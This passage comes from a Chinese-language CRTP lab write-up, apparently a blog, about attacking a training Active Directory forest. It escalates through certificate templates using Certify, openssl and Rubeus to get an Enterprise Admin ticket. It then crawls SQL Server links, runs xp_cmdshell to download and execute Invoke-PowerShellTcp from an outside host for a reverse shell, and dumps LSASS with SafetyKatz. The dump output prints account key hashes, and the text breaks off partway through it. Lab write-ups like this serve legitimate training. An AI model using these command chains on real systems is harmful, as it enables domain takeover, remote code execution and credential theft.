Agent</span></span><br><span class="line"><span class="string">    mspki-certificate-application-policy  : Certificate Request Agent</span></span><br><span class="line"><span class="string">    Permissions</span></span><br><span class="line"><span class="string">      Enrollment Permissions</span></span><br><span class="line"><span class="string">        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513</span></span><br><span class="line"><span class="string">                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line"><span class="string">      Object Control Permissions</span></span><br><span class="line"><span class="string">        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500</span></span><br><span class="line"><span class="string">        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500</span></span><br><span class="line"><span class="string">                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line"><span class="string">        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500</span></span><br><span class="line"><span class="string">                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line"><span class="string">        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500</span></span><br><span class="line"><span class="string">                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br></pre></td></tr></table></figure>

<p>上面这个 <code>SmartCardEnrollment-Agent</code> 模板的eku字段（pkiextendedkeyusage）有 <code>Certificate Request Agent</code>，使用当前证书模板的用户，可以用这个证书去帮其他用户申请别的证书模板。</p>
<p>请求证书</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe  request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local\moneycorp<span class="literal">-MCORP-DC-CA</span> /template:SmartCardEnrollment<span class="literal">-Agent</span></span><br></pre></td></tr></table></figure>

<p>保存到文件再转换一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ad\tools\openssl\openssl.exe pkcs12 <span class="operator">-in</span> esc3.txt <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> cert3.pfx</span><br></pre></td></tr></table></figure>

<p>然后用这张证书去帮企业管理员请求一张证书（</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ad\tools\Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local\moneycorp<span class="literal">-MCORP-DC-CA</span> /template:<span class="string">&quot;User&quot;</span> /onbehalfon:mcorp\Administrator /enrollcert:C:\ad\tools\cert3.pfx /enrollcertpw:<span class="number">123123</span></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-79.png" alt="alt text"></p>
<p>在保存 然后转换一下</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-80.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ad\tools\openssl\openssl.exe pkcs12 <span class="operator">-in</span> esc3<span class="literal">-a</span>.txt <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> cert.pfx</span><br></pre></td></tr></table></figure>

<p>拿着去请求一下企业管理员票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe -path .\Rubeus.exe -args asktgt /user:administrator /dc:mcorp-dc.moneycorp.local /domain:moneycorp.local /certificate:C:\ad\tools\cert.pfx /password:123123 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-81.png" alt="alt text"></p>
<p>flag为 <code>SmartCardEnrollment-Agent</code></p>
<h2 id="Learning-Objective-21-3"><a href="#Learning-Objective-21-3" class="headerlink" title="Learning Objective - 21 - 3"></a>Learning Objective - 21 - 3</h2><blockquote>
<p>Name of the CA attribute that allows requestor to provide Subject Alternative Names</p>
</blockquote>
<blockquote>
<p>允许请求者提供SAN（Subject Alternative Names）字段的这个ca属性的名称</p>
</blockquote>
<p>枚举一下cas即可看到 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe cas</span><br></pre></td></tr></table></figure>

<p>正是 <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code></p>
<p><img src="/wpimages/2025/crtp-lab-note/image-82.png" alt="alt text"></p>
<p>对应的esc6</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#editf_attributesubjectaltname2-esc6">https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#editf_attributesubjectaltname2-esc6</a></p>
</blockquote>
<p>符合的证书模板的话还是刚esc1这个</p>
<p>要看具体的需要ldap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Get-DomainObject -SearchBase &quot;CN=HTTPSCertificates,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=moneycorp,DC=local&quot; -Properties *</span><br></pre></td></tr></table></figure>

<p>flag 为 <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code></p>
<h2 id="Learning-Objective-21-4"><a href="#Learning-Objective-21-4" class="headerlink" title="Learning Objective - 21	- 4"></a>Learning Objective - 21	- 4</h2><blockquote>
<p>Name of the group that has enrollment rights on the CA-Integration template</p>
</blockquote>
<blockquote>
<p>对CA-Integration模板有注册权限的用户组</p>
</blockquote>
<p><img src="/wpimages/2025/crtp-lab-note/image-83.png" alt="alt text"></p>
<p>flag是这个 <code>RDPUsers</code></p>
<h2 id="Learning-Objective-22-1"><a href="#Learning-Objective-22-1" class="headerlink" title="Learning Objective - 22	- 1"></a>Learning Objective - 22	- 1</h2><blockquote>
<p>First SQL Server linked to dcorp-mssql</p>
</blockquote>
<blockquote>
<p>dcorp-mssql的第一个sqlserver的链接</p>
</blockquote>
<p>先通过 powerupsql 枚举域内spn的sql服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-SQLInstanceDomain</span>|<span class="built_in">select</span> Instance</span><br><span class="line"></span><br><span class="line">Instance</span><br><span class="line"><span class="literal">--------</span></span><br><span class="line">dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local,<span class="number">1433</span></span><br><span class="line">dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local,<span class="number">1433</span></span><br><span class="line">dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-sql1</span>.dollarcorp.moneycorp.local,<span class="number">1433</span></span><br><span class="line">dcorp<span class="literal">-sql1</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>然后获取当前用户 <code>student</code> 是否有权限连接到其中某一台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-84.png" alt="alt text"></p>
<p>？？？</p>
<p>哦哦忘记清理票据了用域管票据搞了（x</p>
<p>清理了下就好了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-85.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local</span><br><span class="line">Instance               : DCORP-MSSQL</span><br><span class="line">DomainName             : dcorp</span><br><span class="line">ServiceProcessID       : 1844</span><br><span class="line">ServiceName            : MSSQLSERVER</span><br><span class="line">ServiceAccount         : NT AUTHORITY\NETWORKSERVICE</span><br><span class="line">AuthenticationMode     : Windows and SQL Server Authentication</span><br><span class="line">ForcedEncryption       : 0</span><br><span class="line">Clustered              : No</span><br><span class="line">SQLServerVersionNumber : 15.0.2000.5</span><br><span class="line">SQLServerMajorVersion  : 2019</span><br><span class="line">SQLServerEdition       : Developer Edition (64-bit)</span><br><span class="line">SQLServerServicePack   : RTM</span><br><span class="line">OSArchitecture         : X64</span><br><span class="line">OsVersionNumber        : SQL</span><br><span class="line">Currentlogin           : dcorp\student522</span><br><span class="line">IsSysadmin             : No</span><br><span class="line">ActiveSessions         : 1</span><br><span class="line"></span><br><span class="line">ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local</span><br><span class="line">Instance               : DCORP-MSSQL</span><br><span class="line">DomainName             : dcorp</span><br><span class="line">ServiceProcessID       : 1844</span><br><span class="line">ServiceName            : MSSQLSERVER</span><br><span class="line">ServiceAccount         : NT AUTHORITY\NETWORKSERVICE</span><br><span class="line">AuthenticationMode     : Windows and SQL Server Authentication</span><br><span class="line">ForcedEncryption       : 0</span><br><span class="line">Clustered              : No</span><br><span class="line">SQLServerVersionNumber : 15.0.2000.5</span><br><span class="line">SQLServerMajorVersion  : 2019</span><br><span class="line">SQLServerEdition       : Developer Edition (64-bit)</span><br><span class="line">SQLServerServicePack   : RTM</span><br><span class="line">OSArchitecture         : X64</span><br><span class="line">OsVersionNumber        : SQL</span><br><span class="line">Currentlogin           : dcorp\student522</span><br><span class="line">IsSysadmin             : No</span><br><span class="line">ActiveSessions         : 1</span><br></pre></td></tr></table></figure>

<p>说白了就只有一台能连接的</p>
<p>这里有两种方式能看link，一个是通过视图工具，一个通过powerupsql，后者执行上也会方便些</p>
<ul>
<li>gui工具</li>
</ul>
<p>查询链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master..sysservers</span><br></pre></td></tr></table></figure>

<p>执行链接对端数据库的查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openquery(&quot;DCORP-SQL1&quot;,&#x27;select * from master..sysservers&#x27;)</span><br></pre></td></tr></table></figure>

<p>嵌套</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openquery(&quot;DCORP-SQL1&quot;,&#x27;select * from openquery(&quot;DCORP-MGMT&quot;,&#x27;&#x27;select * from master..sysservers&#x27;&#x27;)&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>powerupsql</li>
</ul>
<p><code>Get-SQLserverLinkcrawl</code> 直接查询嵌套link</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Get-SQLserverLinkcrawl -Instance dcorp-mssql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : DCORP-MSSQL</span><br><span class="line">CustomQuery :</span><br><span class="line">Sysadmin    : 0</span><br><span class="line">Path        : &#123;DCORP-MSSQL&#125;</span><br><span class="line">User        : dcorp\student522</span><br><span class="line">Links       : &#123;DCORP-SQL1&#125;</span><br><span class="line"></span><br><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : DCORP-SQL1</span><br><span class="line">CustomQuery :</span><br><span class="line">Sysadmin    : 0</span><br><span class="line">Path        : &#123;DCORP-MSSQL, DCORP-SQL1&#125;</span><br><span class="line">User        : dblinkuser</span><br><span class="line">Links       : &#123;DCORP-MGMT&#125;</span><br><span class="line"></span><br><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : DCORP-MGMT</span><br><span class="line">CustomQuery :</span><br><span class="line">Sysadmin    : 0</span><br><span class="line">Path        : &#123;DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT&#125;</span><br><span class="line">User        : sqluser</span><br><span class="line">Links       : &#123;EU-SQL34.EU.EUROCORP.LOCAL&#125;</span><br><span class="line"></span><br><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : EU-SQL34</span><br><span class="line">CustomQuery :</span><br><span class="line">Sysadmin    : 1</span><br><span class="line">Path        : &#123;DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL34.EU.EUROCORP.LOCAL&#125;</span><br><span class="line">User        : sa</span><br><span class="line">Links       :</span><br></pre></td></tr></table></figure>

<p>能看到 <code>dcorp-mssql</code> 的下一个link是 <code>DCORP-SQL1</code></p>
<p>所以flag为 <code>DCORP-SQL1</code></p>
<h2 id="Learning-Objective-22-2"><a href="#Learning-Objective-22-2" class="headerlink" title="Learning Objective - 22 - 2"></a>Learning Objective - 22 - 2</h2><blockquote>
<p>Name of SQL Server user used to establish link between dcorp-sql1 and dcorp-mgmt</p>
</blockquote>
<blockquote>
<p>用于从dcorp-sql1到dcorp-mgmt之间建立链接使用的是什么用户</p>
</blockquote>
<p>显然上一问已经写出来了是 <code>sqluser</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : DCORP-MGMT</span><br><span class="line">CustomQuery :</span><br><span class="line">Sysadmin    : 0</span><br><span class="line">Path        : &#123;DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT&#125;</span><br><span class="line">User        : sqluser</span><br><span class="line">Links       : &#123;EU-SQL34.EU.EUROCORP.LOCAL&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-22-3"><a href="#Learning-Objective-22-3" class="headerlink" title="Learning Objective - 22 - 3"></a>Learning Objective - 22 - 3</h2><blockquote>
<p>SQL Server privileges on eu-sql</p>
</blockquote>
<blockquote>
<p>sqlserver在eu-sql上的权限</p>
</blockquote>
<p>这里需要在eu-sql上用xp_cmdshellrce执行whoami看下</p>
<p><code>Get-SQLserverLinkcrawl</code> 如果不指定<code>QueryTarget</code>的话会在每一个link上执行一次这个查询，所以还是指定一下 <code>EU-SQL34</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLserverLinkcrawl -Instance dcorp-mssql -Query &quot;exec master..xp_cmdshell &#x27;set username&#x27;&quot; -QueryTarget EU-SQL34</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-86.png" alt="alt text"></p>
<p>是system权限，6哦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Version     : SQL Server 2019</span><br><span class="line">Instance    : EU-SQL34</span><br><span class="line">CustomQuery : &#123;USERNAME=SYSTEM, &#125;</span><br><span class="line">Sysadmin    : 1</span><br><span class="line">Path        : &#123;DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL34.EU.EUROCORP.LOCAL&#125;</span><br><span class="line">User        : sa</span><br><span class="line">Links       :</span><br></pre></td></tr></table></figure>

<p>然后这一问的是权限，所以flag是 <code>sysadmin</code></p>
<h2 id="Learning-Objective-22-4"><a href="#Learning-Objective-22-4" class="headerlink" title="Learning Objective - 22 - 4"></a>Learning Objective - 22 - 4</h2><blockquote>
<p>Privileges on operating system of eu-sql</p>
</blockquote>
<blockquote>
<p>在eu-sql系统内的权限</p>
</blockquote>
<p>刚才已经whoami看到了是system，所以flag是<code>system</code></p>
<h2 id="EUROCORP-LOCAL"><a href="#EUROCORP-LOCAL" class="headerlink" title="EUROCORP.LOCAL"></a>EUROCORP.LOCAL</h2><blockquote>
<p>通过sql把EUROCORP.LOCAL域日一下</p>
</blockquote>
<p>先想办法弹个shell先</p>
<p>wsl开个8080一会方便传payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-87.png" alt="alt text"></p>
<p>然后开个监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1008</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-88.png" alt="alt text"></p>
<p>执行先看下能不能通信</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLserverLinkcrawl -Instance dcorp-mssql -Query &quot;exec master..xp_cmdshell &#x27;powershell -c IEX(iwr http://172.16.100.22:8080/Invoke-PowerShellTcp.ps1 -UseBasicParsing)&#x27;&quot; -QueryTarget EU-SQL34</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-89.png" alt="alt text"></p>
<p>确认是ok的</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-90.png" alt="alt text"></p>
<p>弹一下shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLserverLinkcrawl -Instance dcorp-mssql -Query &quot;exec master..xp_cmdshell &#x27;powershell -c IEX(iwr http://172.16.100.22:8080/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -IPAddress 172.16.100.22 -Port 10086 -Reverse&#x27;&quot; -QueryTarget EU-SQL34</span><br></pre></td></tr></table></figure>

<p>get</p>
<p>这里后续执行想用smb做的，他这个破学生机器有点问题，得手动改几个地方</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-91.png" alt="alt text"></p>
<p>然后打开下网络共享</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-92.png" alt="alt text"></p>
<p>改一下组策略</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-93.png" alt="alt text"></p>
<p>开一下smb1.0</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-94.png" alt="alt text"></p>
<p>权限如下</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-95.png" alt="alt text"></p>
<p>切到学生机共享的路径下，执行看下lsass的pid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FindLSASSPID.exe</span><br></pre></td></tr></table></figure>

<p>然后dump lsass内存丢smb里就行</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-96.png" alt="alt text"></p>
<p>拿回来加载，然后提取下凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; .\loader.exe <span class="literal">-path</span> .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;sekurlsa::evasive-minidump C:\ad\tools\test1\1.dmp&quot;</span> <span class="string">&quot;sekurlsa::evasive-keys&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : sekurlsa::evasive<span class="literal">-minidump</span> C:\ad\tools\test1\<span class="number">1</span>.dmp sekurlsa::evasive<span class="literal">-keys</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::evasive-minidump C:\ad\tools\test1\1.dmp</span></span><br><span class="line"><span class="keyword">Switch</span> to MINIDUMP : <span class="string">&#x27;C:\ad\tools\test1\1.dmp&#x27;</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::evasive-keys</span></span><br><span class="line">Opening : <span class="string">&#x27;C:\ad\tools\test1\1.dmp&#x27;</span> file <span class="keyword">for</span> minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">1153278</span> (<span class="number">00000000</span>:<span class="number">001198</span>fe)</span><br><span class="line">Session           : RemoteInteractive from <span class="number">2</span></span><br><span class="line">User Name         : dbadmin</span><br><span class="line">Domain            : EU</span><br><span class="line">Logon Server      : EU<span class="literal">-DC</span></span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">46</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-21-3665721161-1121904292-1901483061-1105</span></span><br><span class="line"></span><br><span class="line">         * Username : dbadmin</span><br><span class="line">         * Domain   : EU.EUROCORP.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</span><br><span class="line">           rc4_hmac_nt       <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_old      <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_md4           <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">996</span> (<span class="number">00000000</span>:<span class="number">000003</span>e4)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">Domain            : EU</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">01</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-20</span></span><br><span class="line"></span><br><span class="line">         * Username : eu<span 